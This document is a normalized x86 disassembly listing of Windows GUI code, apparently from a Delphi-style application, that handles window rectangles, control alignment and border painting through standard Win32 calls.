call sub_41b544
mov edx edi
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x194 ]
mov ecx ebx
call sub_41b6d0
sub_44d9d8
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1a4 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x1a4 ] bl
mov eax esi
call sub_44daa8
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb028
mov eax esi
call sub_448138
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
and eax 0xfffeffff
test bl bl
je r-xdata
push eax
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call SetWindowLongA
or eax 0x10000
sub_44da38
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_44da9c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x1a7 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44daa3
lea eax [ ebp - 0x4 ]
call sub_405b50
retn
mov [ ebx + 0x1a7 ] dl
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
test al dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc6
call sub_40358c
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x17c ]
call sub_405b68
sub_44dab4
push ebx
push esi
push edi
add esp 0xffffffc4
mov ebx eax
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
je r-xdata
push esp
mov eax [ ebx + 0x180 ]
push eax
call GetWindowRect
mov [ esp + 0x10 ] 0x2c
lea eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea esi [ esp + 0x2c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ esp ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ ebx + 0x48 ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_4465d8
add esp 0x3c
pop edi
pop esi
pop ebx
retn
push 0xfffffff8
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
push esp
push esi
call ScreenToClient
lea eax [ esp + 0x8 ]
push eax
push esi
call ScreenToClient
sub_44db6c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x194 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x4 ] 0x0
mov eax [ ebp + 0x194 ]
mov edx [ esp + 0x4 ]
call sub_41b654
mov ebx eax
mov edx ebx
mov eax [ esp ]
call sub_41b4f8
mov edx [ esp ]
mov eax ebx
mov si 0xffb4
call sub_40358c
inc [ esp + 0x4 ]
dec edi
jne r-xdata
sub_44dbcc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_44dcc2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb4
call sub_40358c
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44dcc9
mov eax [ ebp - 0x14 ]
call sub_403390
retn
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_41b6b0
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ ebp - 0x14 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_41b654
mov edi eax
mov eax edi
mov si 0xffb8
call sub_40358c
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x1a4 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ edi + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_44dcd8
push ebp
mov ebp esp
push esi
mov esi edx
mov edx [ ebp + 0x8 ]
push edx
xor dl 0x1
push edx
mov edx esi
call sub_44dbcc
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_44dd04
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_45dd9c
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_44dbcc
test eax eax
jne r-xdata
test eax eax
je r-xdata
push 0x0
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_44dbcc
mov edx eax
mov eax esi
call sub_461a08
sub_44dd48
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44a49c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44a460
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_44dd90
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_44d414
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4471f4
sub_44ddd8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x74 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor edx edx
mov [ edi ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x14 ]
mov [ edi ] edx
jmp r-xdata
xor edx edx
mov [ ecx ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x10 ]
mov [ ecx ] edx
jmp r-xdata
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov edx [ ebp + 0xc ]
xor ebx ebx
mov [ edx ] ebx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0xc ]
mov ebx [ ebp + 0xc ]
mov [ ebx ] edx
jmp r-xdata
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_44de5c
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_44daa8
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_44a49c
test eax eax
je r-xdata
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8c ]
lea eax [ ebp - 0x5d ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x55 ]
sub edx [ ebp - 0x5d ]
sub eax edx
mov [ ebp - 0xc ] eax
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x51 ]
sub ecx [ ebp - 0x59 ]
sub edx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
xor ecx ecx
push ebp
push sub_44e21e
push [ fs : ecx ]
mov [ fs : ecx ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_44a49c
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
inc edi
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_44ddd8
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x4d ] 0x0
jmp r-xdata
mov [ ebp - 0x4d ] 0x1
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_44a460
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
sub eax [ ebx + 0x48 ]
sub eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4d ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
add eax [ ebp - 0x44 ]
sub eax [ ebx + 0x48 ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
mov [ ebp - 0x4d ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
xor eax eax
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov al 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
mov dl [ ebp - 0x4d ]
dec edx
sub dl 0x2
jb r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
sub edx [ ebx + 0x4c ]
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edx
mov al 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
add edx [ ebp - 0x4c ]
sub edx [ ebx + 0x4c ]
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov al 0x3
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x40 ]
jge r-xdata
mov edx [ ebx + 0x48 ]
add [ ebp - 0x30 ] edx
add [ ebp - 0x34 ] edx
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x44 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x40 ]
mov [ edx ] ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x20 ]
jle r-xdata
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
mov [ edx ] ecx
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x24 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebx + 0x4c ]
add [ ebp - 0x38 ] eax
add [ ebp - 0x3c ] eax
jmp r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
sub_44e235
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_44de5c
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_447fd4
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_44e274
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_448e58
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x74 ]
mov eax edi
call sub_4468ec
cmp [ edi + 0x158 ] 0x0
jne r-xdata
sub_44e2bc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_449078
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x158 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_44e2ec
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
call sub_44daa8
test al al
je r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb4 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax [ ebp - 0x4 ]
call sub_44a004
xor ecx ecx
push ebp
push sub_44e41b
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
call sub_44a49c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_44a49c
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e422
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_44a00c
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edi [ ebp - 0x28 ]
sub edi [ ebp - 0x38 ]
jmp r-xdata
add cl 0xfd
sub cl 0x2
jae r-xdata
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
sub dl 0x3
jae r-xdata
xor edi edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_44a460
cmp [ eax + 0x57 ] 0x0
jne r-xdata
xor edx edx
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
sub ecx [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
sub edx edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_44e422
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x28 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x48 ]
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x38 ]
sub eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
cmp dl 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
sub al 0x3
jae r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_40358c
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4c ]
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x34 ]
sub eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
cmp dl 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_40358c
jmp r-xdata
sub_44e4b8
sub edx 0x1
jb r-xdata
cmp cl [ eax + 0x163 ]
je r-xdata
je r-xdata
retn
mov [ eax + 0x163 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_448138
retn
cmp cl [ eax + 0x164 ]
je r-xdata
jmp r-xdata
mov [ eax + 0x164 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_448138
sub_44e4fc
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x162 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x162 ] al
push 0x0
xor ecx ecx
mov edx 0xb03b
mov eax ebx
call sub_448138
sub_44e54c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x8 ]
mov esi eax
mov eax [ ebx + 0x16c ]
neg eax
push eax
mov edx [ ebx + 0x16c ]
neg edx
push eax
mov edi esi
push edi
call InflateRect
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add eax [ ebx + 0x168 ]
mov esi edi
test [ ebx + 0x162 ] 0x1
je r-xdata
add eax [ ebx + 0x168 ]
test [ ebx + 0x162 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x162 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x162 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
sub [ esi + 0xc ] eax
sub_44e5dc
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_44e842
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call GetClientRect
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
push eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call InflateRect
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x16c ] 0x0
jbe r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_42763c
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call ReleaseDC
retn
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x163 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
call sub_43a564
call sub_43a644
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x164 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call GetWindowLongA
mov esi eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
call sub_43a564
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_43ac5c
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x2c ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x28 ] ebx
test esi 0x200000
je r-xdata
add [ ebp - 0x24 ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x8
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x24 ] eax
test esi 0x100000
je r-xdata
add [ ebp - 0x20 ] ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x162 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x165 ]
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x163 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
